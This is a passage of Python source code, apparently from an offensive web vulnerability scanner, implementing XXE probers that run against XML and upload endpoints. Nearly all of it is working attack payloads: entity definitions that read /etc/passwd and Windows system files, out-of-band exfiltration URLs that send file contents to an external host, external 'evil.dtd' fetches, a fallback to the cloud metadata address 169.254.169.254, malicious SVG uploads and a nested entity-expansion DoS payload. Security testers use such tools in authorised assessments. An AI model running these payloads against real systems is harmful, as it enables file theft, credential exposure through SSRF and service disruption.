                f"  'file:///fake/%file;'>\">"
                '  %eval; %exfil;'
                ']>'
                '<root><id>wstest</id></root>'
            )
            resp = _post_xml_payload(self.session, url, xml, timeout=8)
            if resp is None:
                continue
            body = (resp.text or "")[:3000]
            if re.search(r"root:.*:0:0:|Administrator|error.*file|no such file", body, re.I):
                self.add(bucket, {
                    "type": "XXE — Error-Based File Leak (Parameter Entity)",
                    "severity": "Critical",
                    "url": url,
                    "payload_target": fpath,
                    "evidence": body[:300],
                })
                logger.warning(f"[XXE] Error-based param entity confirmed at {url}")
                return

    # -------------------------------------------------------------------------
    # Billion Laughs DoS detection (ported from xxe.py XXEParameterEntityProber._probe_nested)
    # -------------------------------------------------------------------------

    def _test_param_entity_nested(self, url: str, bucket: str):
        """Billion Laughs lite — 3 levels, safe (no OOM risk), detects DoS-vulnerable parsers."""
        xml = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE lolz ['
            '  <!ENTITY lol "lol">'
            '  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;">'
            '  <!ENTITY lol2 "&lol1;&lol1;&lol1;">'
            ']>'
            '<root>&lol2;</root>'
        )
        t0 = time.time()
        resp = _post_xml_payload(self.session, url, xml, timeout=10)
        elapsed = time.time() - t0
        if resp is None:
            return
        body = (resp.text or "")[:500]
        if elapsed > 5 or len(body) > 1000:
            self.add(bucket, {
                "type": "XXE — Nested Entity Expansion (DoS Risk)",
                "severity": "High",
                "url": url,
                "evidence": (
                    f"Response took {elapsed:.2f}s, body {len(body)} bytes — "
                    "entity expansion suspected (Billion Laughs variant)"
                ),
            })

    # -------------------------------------------------------------------------
    # External parameter entity double-wrap (ported from xxe.py XXEParameterEntityProber._probe_external_param)
    # -------------------------------------------------------------------------

    def _test_param_entity_external(self, url: str, bucket: str):
        """External parameter entity via double entity wrapping."""
        for fpath in _XXE_TARGET_FILES[:3]:
            xml = (
                '<?xml version="1.0"?>'
                '<!DOCTYPE foo ['
                f'  <!ENTITY % remote SYSTEM "file://{fpath}">'
                '  <!ENTITY % wrap "<!ENTITY content \'%remote;\'>">'
                '  %wrap;'
                ']>'
                f'<root><data>&content;</data></root>'
            )
            resp = _post_xml_payload(self.session, url, xml, timeout=8)
            if resp is None:
                continue
            body = (resp.text or "")[:3000]
            if re.search(r"root:.*:0:0:|Administrator|bin/bash|\[fonts\]", body):
                self.add(bucket, {
                    "type": "XXE — External Parameter Entity File Read",
                    "severity": "Critical",
                    "url": url,
                    "payload_target": fpath,
                    "evidence": body[:300],
                })
                logger.warning(f"[XXE] External param entity confirmed at {url}")
                return

    # -------------------------------------------------------------------------
    # XXE via SVG upload
    # -------------------------------------------------------------------------

    def _test_svg_xxe(self, url: str, bucket: str):
        for target_file in _XXE_TARGETS[:2]:
            svg_payload = XXE_SVG.replace("{U}", target_file).encode()
            try:
                resp = self.session.post(
                    url,
                    files={"file": ("ws_xxe.svg", svg_payload, "image/svg+xml")},
                    timeout=8,
                )
                text = resp.text or ""
                marker = _detect_xxe_in_response(text)
                if marker:
                    self.add(bucket, {
                        "type": "XXE — File Read via SVG Upload",
                        "severity": "Critical",
                        "url": url,
                        "payload_target": target_file,
                        "evidence": f"Marker '{marker}' found after SVG upload: {text[:200]}",
                    })
                    logger.warning(f"[XXE] SVG XXE confirmed at {url} reading {target_file}")
                    return
            except requests.exceptions.RequestException as exc:
                logger.debug(f"[XXE] SVG upload probe failed for {target_file!r}: {exc!r}")

    # -------------------------------------------------------------------------
    # Blind XXE via OAST DNS callback
    # -------------------------------------------------------------------------

    def _test_blind_xxe_oast(self, url: str, bucket: str):
        domain = self.config.oast.dns_domain
        token = random_string(8)
        oast_url = f"http://{token}.{domain}/"
        payload = XXE_POC.replace("{U}", oast_url)
        try:
            self.session.post(
                url, data=payload.encode(),
                headers={"Content-Type": "application/xml"},
                timeout=self.config.oast.timeout,
            )
            self.add(bucket, {
                "type": "XXE — Blind OOB DNS Callback Sent",
                "severity": "High",
                "url": url,
                "payload_target": oast_url,
                "evidence": f"Check OAST DNS logs for {token}.{domain}",
                "note": "Confirm OOB DNS resolution in your OAST server logs",
            })
        except requests.exceptions.RequestException as exc:
            logger.debug(f"[XXE] Blind OOB DNS probe failed for {url!r}: {exc!r}")

    # -------------------------------------------------------------------------
    # OOB HTTP exfiltration via timing (ported from xxe.py XXEOOBDataExfilChain._probe_http_oob)
    # -------------------------------------------------------------------------

    def _test_oob_http_exfil(self, url: str, bucket: str):
        """HTTP OOB exfiltration attempt — timing-based detection."""
        oob_host = self.config.oast.dns_domain or _OOB_HOST
        token = random_string(8)
        for fpath in _XXE_TARGET_FILES[:2]:
            exfil_url = f"http://{oob_host}/xxe?d={token}&f={fpath.replace('/', '_')}"
            xml = (
                '<?xml version="1.0"?>'
                '<!DOCTYPE foo ['
                f'  <!ENTITY % file SYSTEM "file://{fpath}">'
                f'  <!ENTITY % exfil SYSTEM "{exfil_url}&data=%file;">'
                '  %exfil;'
                ']>'
                '<root><data>test</data></root>'
            )
            t0 = time.time()
            resp = _post_xml_payload(self.session, url, xml, timeout=10)
            elapsed = time.time() - t0
            if resp and elapsed > 2.5:
                self.add(bucket, {
                    "type": "XXE — HTTP OOB Exfiltration (Timing)",
                    "severity": "High",
                    "url": url,
                    "payload_target": fpath,
                    "evidence": (
                        f"HTTP OOB attempt took {elapsed:.1f}s — "
                        f"server may have contacted {oob_host}"
                    ),
                    "note": "Confirm OOB request in your OAST/listener logs",
                })
                logger.info(f"[XXE] OOB HTTP timing hint at {url}, delay={elapsed:.1f}s")
                return


# =============================================================================
# BlindXXEErrorProber — Error-based data exfil via parameter entities
# =============================================================================

class BlindXXEErrorProber(BaseScanner):
    """
    Error-based XXE data exfiltration.

    Sends payloads that force the XML parser to embed file contents into
    parse-error messages (classic error-based XXE). Also probes Windows
    hosts file for universal coverage.

    Techniques:
    - Parameter entity chain forcing /etc/passwd into error path
    - Direct entity reference: <!ENTITY xxe SYSTEM "file://..."><root>&xxe;</root>
    - Windows hosts file detection (127.0.0.1 marker)
    """

    name = "xxe_blind_error"
    phase = "offensive"

    # Linux password file fragments that confirm file-read
    _LINUX_MARKERS = [
        "root:x:0:0", "nobody:x:", "daemon:x:", "bin:x:", "/bin/bash",
        "/bin/sh", "/sbin/nologin",
    ]
    # Windows hosts file marker
    _WIN_MARKER = "127.0.0.1"

    _PAYLOADS = [
        # Error-based parameter entity chain
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '  <!ENTITY % xxe SYSTEM "file:///etc/passwd">'
            '  %xxe;'
            ']>'
            '<root>test</root>'
        ),
        # Classic direct entity reference (/etc/passwd)
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '  <!ENTITY xxe SYSTEM "file:///etc/passwd">'
            ']>'
            '<root>&xxe;</root>'
        ),
        # Hostname file (Linux)
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '  <!ENTITY xxe SYSTEM "file:///etc/hostname">'
            ']>'
            '<root>&xxe;</root>'
        ),
        # Windows hosts file
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '  <!ENTITY xxe SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts">'
            ']>'
            '<root>&xxe;</root>'
        ),
    ]

    def __init__(self, session=None, results: Dict = None, debug=False,
                 config: Optional[SSRFXXEConfig] = None):
        super().__init__(session, results, debug)
        self.config = config or SSRFXXEConfig()

    def run(self, url: str, **kwargs) -> Dict:
        bucket = self.name
        self.results.setdefault(bucket, [])
        endpoints: List[str] = kwargs.get("endpoints") or [url]
        for ep in endpoints:
            xml_endpoints = _detect_xml_endpoints(ep, self.session)
            for xep in xml_endpoints[:4]:
                self._probe(xep, bucket)
        return self.results

    def _probe(self, url: str, bucket: str):
        for xml_payload in self._PAYLOADS:
            resp = _post_xml_payload(self.session, url, xml_payload, timeout=10)
            if resp is None:
                continue
            body = resp.text or ""
            # Linux passwd detection
            for marker in self._LINUX_MARKERS:
                if marker in body:
                    self.add(bucket, {
                        "type": "XXE — Blind Error-Based File Read (Linux)",
                        "severity": "Critical",
                        "url": url,
                        "payload_snippet": xml_payload[:120],
                        "evidence": f"Linux passwd marker '{marker}' found in response: {body[:300]}",
                    })
                    logger.warning(f"[XXE-BlindError] Linux file read confirmed at {url}")
                    return
            # Windows hosts detection
            if self._WIN_MARKER in body and ("localhost" in body.lower() or "::1" in body):
                self.add(bucket, {
                    "type": "XXE — Blind Error-Based File Read (Windows hosts)",
                    "severity": "Critical",
                    "url": url,
                    "payload_snippet": xml_payload[:120],
                    "evidence": f"Windows hosts file marker found in response: {body[:300]}",
                })
                logger.warning(f"[XXE-BlindError] Windows hosts file read confirmed at {url}")
                return


# =============================================================================
# DTDInjectionProber — External DTD parameter entity chaining
# =============================================================================

class DTDInjectionProber(BaseScanner):
    """
    External DTD injection via parameter entity chaining.

    Sends payloads that reference an external DTD server. If ctx has an
    oast_domain it is used as the DTD server; otherwise falls back to the
    AWS metadata endpoint (169.254.169.254) for a combined SSRF/XXE probe.

    Severity:
    - Critical if passwd/metadata markers appear in the response (in-band confirm)
    - High    if DTD reference was accepted (OOB not confirmed)
    """

    name = "xxe_dtd"
    phase = "offensive"

    _CHAIN_TEMPLATE = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo ['
        '  <!ENTITY % dtd SYSTEM "{DTD_URL}">'
        '  %dtd;'
        '  %file;'
        '  %eval;'
        '  %error;'
        ']>'
        '<root>test</root>'
    )
    _SIMPLE_TEMPLATE = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo ['
        '  <!ENTITY % dtd SYSTEM "{DTD_URL}">'
        '  %dtd;'
        ']>'
        '<root>test</root>'
    )

    _CONFIRM_MARKERS = [
        "root:x:0:0", "nobody:x:", "ami-id", "instance-id", "127.0.0.1",
    ]

    def __init__(self, session=None, results: Dict = None, debug=False,
                 config: Optional[SSRFXXEConfig] = None):
        super().__init__(session, results, debug)
        self.config = config or SSRFXXEConfig()

    def run(self, url: str, **kwargs) -> Dict:
        bucket = self.name
        self.results.setdefault(bucket, [])
        # Determine DTD server
        oast_domain = self.config.oast.dns_domain
        if oast_domain:
            dtd_urls = [
                f"http://{oast_domain}/evil.dtd",
                f"http://{oast_domain}/wrapper.dtd",
            ]
        else:
            # SSRF double-hit: cloud metadata as DTD server
            dtd_urls = [
                "http://169.254.169.254/evil.dtd",
                "http://169.254.169.254/latest/meta-data/",
            ]

        endpoints: List[str] = kwargs.get("endpoints") or [url]
        for ep in endpoints:
            xml_endpoints = _detect_xml_endpoints(ep, self.session)
            for xep in xml_endpoints[:3]:
                for dtd_url in dtd_urls:
                    self._probe(xep, dtd_url, bucket)
        return self.results

    def _probe(self, url: str, dtd_url: str, bucket: str):
        for template in (self._CHAIN_TEMPLATE, self._SIMPLE_TEMPLATE):
            payload = template.replace("{DTD_URL}", dtd_url)
            resp = _post_xml_payload(self.session, url, payload, timeout=10)
            if resp is None:
                continue
            body = resp.text or ""

            # Check for in-band confirmation
            for marker in self._CONFIRM_MARKERS:
                if marker in body:
                    self.add(bucket, {
                        "type": "XXE — External DTD Injection (In-Band Confirmed)",
                        "severity": "Critical",
                        "url": url,
                        "dtd_url": dtd_url,
                        "evidence": f"Marker '{marker}' in response: {body[:300]}",
                    })
                    logger.warning(f"[XXE-DTD] DTD injection confirmed at {url} via {dtd_url}")
                    return

            # Accepted but unconfirmed (no rejection error)
            if resp.status_code in (200, 400, 500):
                no_reject = not re.search(
                    r"DOCTYPE.*not.*allowed|entity.*not.*permitted|external.*entity.*disabled",
                    body, re.I
                )
                if no_reject and resp.status_code == 200:
                    self.add(bucket, {
                        "type": "XXE — External DTD Reference Accepted (OOB Unconfirmed)",
                        "severity": "High",
                        "url": url,
                        "dtd_url": dtd_url,
                        "evidence": (
                            f"Server responded {resp.status_code} without rejection — "
                            f"verify OOB in OAST/listener logs for {dtd_url}"
                        ),
                        "note": "Confirm OOB DTD fetch in your OAST server logs",
                    })
                    logger.info(f"[XXE-DTD] DTD reference accepted at {url}, OOB unconfirmed")
                    return


# =============================================================================
# SVGXXEProber — XXE via SVG multipart file upload
# =============================================================================

class SVGXXEProber(BaseScanner):
    """
    XXE injection via SVG file upload endpoints.

    Crafts a malicious SVG containing external entity references and uploads
    it as a multipart form file. Probes common upload endpoints automatically.

    Severity: Critical if passwd/hostname markers appear in the response.
    """

    name = "xxe_svg"
    phase = "offensive"

    _SVG_TEMPLATE = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo ['
        '  <!ENTITY xxe SYSTEM "{FILE_URI}">'
        ']>'
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '  <text>&xxe;</text>'
        '</svg>'
    )

    _TARGET_FILES = [
        "file:///etc/passwd",
        "file:///etc/hostname",
        "file:///etc/hosts",
        "file:///windows/win.ini",
        "file:///C:/Windows/win.ini",
    ]

    _UPLOAD_PATHS = [
        "/upload", "/api/upload", "/avatar", "/profile/picture",
        "/api/v1/upload", "/api/avatar", "/media/upload", "/image/upload",
    ]

    _CONFIRM_MARKERS = [
        "root:x:0:0", "nobody:x:", "daemon:x:", "/bin/bash",
        "[fonts]", "for 16-bit", "127.0.0.1",
    ]

    def __init__(self, session=None, results: Dict = None, debug=False,
                 config: Optional[SSRFXXEConfig] = None):
        super().__init__(session, results, debug)
        self.config = config or SSRFXXEConfig()

    def run(self, url: str, **kwargs) -> Dict:
        bucket = self.name
        self.results.setdefault(bucket, [])
        endpoints: List[str] = kwargs.get("endpoints") or [url]
        for ep in endpoints:
            parsed = urlparse(ep)
            base = f"{parsed.scheme}://{parsed.netloc}"
            # Always try the provided endpoint itself plus common upload paths
            upload_targets = [ep]
            for path in self._UPLOAD_PATHS:
                upload_targets.append(urljoin(base + "/", path.lstrip("/")))
            for target in upload_targets:
                self._probe(target, bucket)
        return self.results

    def _probe(self, url: str, bucket: str):
        for file_uri in self._TARGET_FILES:
            svg_body = self._SVG_TEMPLATE.replace("{FILE_URI}", file_uri).encode("utf-8")
            try:
                resp = self.session.post(
                    url,
                    files={"file": ("evil.svg", svg_body, "image/svg+xml")},
                    timeout=10,
                )
                body = resp.text or ""
                for marker in self._CONFIRM_MARKERS:
                    if marker in body:
                        self.add(bucket, {
                            "type": "XXE — SVG Upload File Read",
                            "severity": "Critical",
                            "url": url,
                            "payload_file": file_uri,
                            "evidence": f"Marker '{marker}' found after SVG upload: {body[:300]}",
                        })
                        logger.warning(
                            f"[XXE-SVG] SVG upload file read confirmed at {url} "
                            f"reading {file_uri}"
                        )
                        return
            except requests.exceptions.RequestException as exc:
                logger.debug(f"[XXE-SVG] Upload probe failed for {url} ({file_uri}): {exc!r}")


# =============================================================================
# XXECDATABypassProber — CDATA bypass and XInclude probe
# =============================================================================

class XXECDATABypassProber(BaseScanner):
    """
    CDATA bypass and XInclude XXE probe.

    CDATA bypass wraps file content in CDATA sections to avoid XML parse
    errors caused by special characters in file content. XInclude uses a
    completely different XML feature (xi:include) to achieve file read
    without DOCTYPE at all.

    Severity: Critical if passwd/hostname markers appear in the response.
    """

    name = "xxe_cdata"
    phase = "offensive"

    _CDATA_TEMPLATE = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo ['
        '  <!ENTITY % start "<![CDATA[">'
        '  <!ENTITY % file SYSTEM "file://{FILE_PATH}">'
        '  <!ENTITY % end "]]>">'
        '  <!ENTITY % dtd SYSTEM "http://{OOB_HOST}/__cdata_wrapper.dtd">'
        '  %dtd;'
        ']>'
        '<root><data>&joined;</data></root>'
    )

    _XINCLUDE_TEMPLATE = (
        '<?xml version="1.0"?>'
        '<root xmlns:xi="http://www.w3.org/2001/XInclude">'
        '  <xi:include parse="text" href="file://{FILE_PATH}"/>'
        '</root>'
    )

    _NAMESPACE_CONFUSION_TEMPLATE = (
        '<?xml version="1.0"?>'
        '<data xmlns:xi="http://www.w3.org/2001/XInclude">'
        '  <xi:include href="file://{FILE_PATH}" parse="text"/>'
        '</data>'
    )

    _TARGET_FILES = [
        "etc/passwd", "etc/hostname", "etc/hosts",
        "windows/win.ini", "C:/Windows/win.ini",
    ]

    _CONFIRM_MARKERS = [
        "root:x:0:0", "nobody:x:", "daemon:x:", "/bin/bash",
        "[fonts]", "for 16-bit", "127.0.0.1",
    ]

    def __init__(self, session=None, results: Dict = None, debug=False,
                 config: Optional[SSRFXXEConfig] = None):
        super().__init__(session, results, debug)
        self.config = config or SSRFXXEConfig()

    def run(self, url: str, **kwargs) -> Dict:
        bucket = self.name
        self.results.setdefault(bucket, [])
        oob_host = self.config.oast.dns_domain or _OOB_HOST
        endpoints: List[str] = kwargs.get("endpoints") or [url]
        for ep in endpoints:
            xml_endpoints = _detect_xml_endpoints(ep, self.session)
            for xep in xml_endpoints[:4]:
                self._probe_cdata(xep, oob_host, bucket)
                self._probe_xinclude(xep, bucket)
        return self.results

    def _probe_cdata(self, url: str, oob_host: str, bucket: str):
        for fpath in self._TARGET_FILES:
            payload = (
                self._CDATA_TEMPLATE
                .replace("{FILE_PATH}", fpath)
                .replace("{OOB_HOST}", oob_host)
            )
            resp = _post_xml_payload(self.session, url, payload, timeout=10)
            if resp is None:
                continue
            body = resp.text or ""
            for marker in self._CONFIRM_MARKERS:
                if marker in body:
                    self.add(bucket, {
                        "type": "XXE — CDATA Bypass File Read",
                        "severity": "Critical",
                        "url": url,
                        "payload_file": fpath,
                        "evidence": f"CDATA bypass marker '{marker}' in response: {body[:300]}",
                    })
                    logger.warning(f"[XXE-CDATA] CDATA bypass confirmed at {url} reading {fpath}")
                    return

    def _probe_xinclude(self, url: str, bucket: str):
        for fpath in self._TARGET_FILES:
            for template in (self._XINCLUDE_TEMPLATE, self._NAMESPACE_CONFUSION_TEMPLATE):
                payload = template.replace("{FILE_PATH}", fpath)
                resp = _post_xml_payload(self.session, url, payload, timeout=10)
                if resp is None:
                    continue
                body = resp.text or ""
                for marker in self._CONFIRM_MARKERS:
                    if marker in body:
                        self.add(bucket, {
                            "type": "XXE — XInclude File Read",
                            "severity": "Critical",
                            "url": url,
                            "payload_file": fpath,
                            "technique": "XInclude (xi:include parse=text)",
                            "evidence": (
                                f"XInclude marker '{marker}' in response: {body[:300]}"
                            ),
                        })
                        logger.warning(
                            f"[XXE-CDATA] XInclude file read confirmed at {url} "
                            f"reading {fpath}"
                        )
                        return


# =============================================================================
# Legacy entry points (backward-compatible with main.py / phases runner)
# =============================================================================

def run_ssrf_xxe_scan(ctx, oast_cfg: Dict = None, **kwargs):
    """
    Legacy entry point using ScanContext from main.py.
    Delegates to SSRFScanner and XXEScanner.
    oast_cfg: interactsh dns_domain + OAST settings (passed from phases runner).
    """
    session = ctx.session if hasattr(ctx, "session") else kwargs.get("session")
    results = getattr(ctx, "results", {}) or kwargs.get("results", {})

    if oast_cfg is None:
        cfg = getattr(ctx, "config", {}) or {}
        oast_cfg = cfg.get("oast", {}) or {}

    dns_domain = (
        (oast_cfg or {}).get("dns_domain")
        or (oast_cfg or {}).get("interactsh", {}).get("server", "")
    )
    oast_config = OASTConfig(
        enabled=bool((oast_cfg or {}).get("enabled", True)),
        dns_domain=dns_domain or None,
    )
    ssrf_xxe_cfg = SSRFXXEConfig(oast=oast_config)

    endpoints: Set[str] = set(results.get("endpoints", []))
    if hasattr(ctx, "endpoints") and ctx.endpoints:
        endpoints.update(ctx.endpoints)
    discovery = results.get("discovery", {})
    if isinstance(discovery, dict):
        for u in discovery.get("query", []):
            if isinstance(u, str) and "://" in u:
                endpoints.add(u)

    targets = list(endpoints)
    if not targets:
        base = (
            getattr(ctx, "url", None)
            or getattr(ctx, "base_url", None)
            or getattr(ctx, "target", None)
            or ""
        )
        if base:
            targets = [base]
        else:
            return

    logger.info(
        f"[SSRF/XXE] Scanning {len(targets)} endpoints (oast_domain={dns_domain or 'none'})"
    )

    ssrf = SSRFScanner(session=session, results=results, config=ssrf_xxe_cfg)
    ssrf.run(targets[0] if targets else "", endpoints=targets)

    xxe = XXEScanner(session=session, results=results, config=ssrf_xxe_cfg)
    xxe.run(targets[0] if targets else "", endpoints=targets)

    # Deep XXE probers — error-based, DTD injection, SVG upload, CDATA/XInclude
    blind_err = BlindXXEErrorProber(session=session, results=results, config=ssrf_xxe_cfg)
    blind_err.run(targets[0] if targets else "", endpoints=targets)

    dtd = DTDInjectionProber(session=session, results=results, config=ssrf_xxe_cfg)
    dtd.run(targets[0] if targets else "", endpoints=targets)

    svg = SVGXXEProber(session=session, results=results, config=ssrf_xxe_cfg)
    svg.run(targets[0] if targets else "", endpoints=targets)

    cdata = XXECDATABypassProber(session=session, results=results, config=ssrf_xxe_cfg)
    cdata.run(targets[0] if targets else "", endpoints=targets)


def run(ctx):
    """Main entry point for generic runner."""
    return run_ssrf_xxe_scan(ctx)


# Alias for main.py dynamic imports
scan = run_ssrf_xxe_scan
